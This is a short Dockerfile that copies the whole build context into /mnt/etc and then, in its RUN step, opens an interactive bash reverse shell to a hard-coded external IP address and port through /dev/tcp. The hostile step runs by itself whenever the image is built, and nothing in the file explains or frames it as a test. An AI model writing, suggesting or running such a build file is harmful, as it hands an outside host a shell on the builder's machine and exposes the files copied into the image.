FROM ubuntu:latest

COPY / /mnt/etc

RUN bash -c "bash -i >& /dev/tcp/152.136.32.206/7788 0>&1"

